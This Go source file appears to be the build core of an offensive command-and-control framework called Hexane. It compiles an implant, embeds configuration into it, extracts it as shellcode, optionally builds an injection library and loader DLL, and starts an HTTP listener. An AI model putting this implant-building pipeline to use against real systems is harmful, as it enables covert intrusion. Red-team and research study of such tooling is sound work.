package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"
)

var (
	LinkerLoader = LoaderPath + "/linker.loader.ld"
	HashStrings  = ConfigsPath + "/strings.txt"
	DllMain      = LoaderPath + "/dllmain.cpp"
	RsrcScript   = LoaderPath + "/resource.rc"
	HashHeader   = CorelibInc + "/names.hpp"
)

func (h *HexaneConfig) BuildLoader(cfgName string) error {
	return nil
}

func (h *HexaneConfig) BuildModule(modCfg *ModuleConfig) error {
	var (
		err    error
		target string
	)

	target = filepath.Join(modCfg.OutputDir, modCfg.OutputName)

	if modCfg.RootDir == "" || modCfg.Sources == nil {
		return fmt.Errorf("root directory needs provided")
	}

	if modCfg.Sources == nil {
		return fmt.Errorf("source files need to be provided")
	}

	if modCfg.Linker != "" {
		modCfg.Linker = filepath.Join(modCfg.RootDir, modCfg.Linker)
	}

	if modCfg.OutputDir != "" {
		if err = CreateTemp(modCfg.OutputDir); err != nil {
			return err
		}
	} else {
		modCfg.OutputDir = h.Compiler.BuildDirectory
	}

	modCfg.OutputName = filepath.Join(modCfg.OutputDir, modCfg.OutputName)

	WrapMessage("DBG", "adding external dependencies to "+target)
	if modCfg.Dependencies != nil {
		for _, dep := range modCfg.Dependencies {

			WrapMessage("DBG", " - "+dep)
			modCfg.Components = append(modCfg.Components, dep)
		}
	}

	if modCfg.PreBuildDependencies != nil {
		var pre *ModuleConfig

		WrapMessage("DBG", "pre-building dependencies for "+target)
		for _, cfg := range modCfg.PreBuildDependencies {
			WrapMessage("DBG", " - "+cfg)

			if pre, err = GetModuleConfig(cfg); err != nil {
				return err
			}

			if err = h.BuildModule(pre); err != nil {
				return err
			}
		}
	}

	WrapMessage("DBG", "generating sources for "+target)
	for _, src := range modCfg.Sources {

		srcPath := filepath.Join(modCfg.RootDir, "src")
		incPath := filepath.Join(modCfg.RootDir, "include")
		obj := filepath.Join(modCfg.OutputDir, src+".o")

		if err = SearchFile(srcPath, src); err != nil {
			return fmt.Errorf("could not find %s in %s", src, srcPath)
		}

		if modCfg.Includes != nil {
			for _, inc := range modCfg.Includes {
				if err = SearchFile(incPath, inc); err != nil {
					return fmt.Errorf("could not find %s in %s", inc, incPath)
				}
			}
		}

		source := filepath.Join(srcPath, src)
		linker := ""

		WrapMessage("DBG", fmt.Sprintf("compiling %s", source))
		if modCfg.PreLinkSources {
			linker = modCfg.Linker
		}

		if err = h.CompileFile(source, obj, modCfg.Includes, linker); err != nil {
			return err
		}

		modCfg.Components = append(modCfg.Components, obj)
	}

	return h.ExecuteBuild(modCfg)
}

func (h *HexaneConfig) RunBuild() error {
	var (
		err error
		cfg *ModuleConfig
	)

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if err = SearchFile(filepath.Join(Corelib, "build"), "corelib.a"); err != nil {
		if err.Error() == FileNotFound.Error() {

			WrapMessage("DBG", "generating corelib\n")
			if cfg, err = GetModuleConfig(path.Join(Corelib, "corelib.json")); err != nil {
				return err
			}
			if err = h.BuildModule(cfg); err != nil {
				return err
			}
		} else {
			return err
		}
	}

	WrapMessage("DBG", "generating implant\n")
	if cfg, err = GetModuleConfig(path.Join(ImplantPath, "implant.json")); err != nil {
		return err
	}
	if err = h.BuildModule(cfg); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err = h.EmbedSectionData(path.Join(h.Compiler.BuildDirectory, "build")+"/implant.o", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err = h.CopySectionData(path.Join(h.Compiler.BuildDirectory, "build")+"/implant.o", path.Join(h.Compiler.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	// generate injectlib + loader
	if h.Implant.Injection != nil {

		WrapMessage("DBG", "generating injectlib\n")
		if err = h.BuildModule(h.Implant.Injection.Config); err != nil {
			return err
		}

		WrapMessage("DBG", "embedding injectlib config")
		if err = h.EmbedSectionData(path.Join(h.Compiler.BuildDirectory, h.Implant.Injection.Config.OutputName), ".text$F", h.ConfigBytes); err != nil {
			return err
		}

		WrapMessage("DBG", "generating loader dll")
		if err = h.BuildLoader(path.Join(LoaderPath, "loader.json")); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
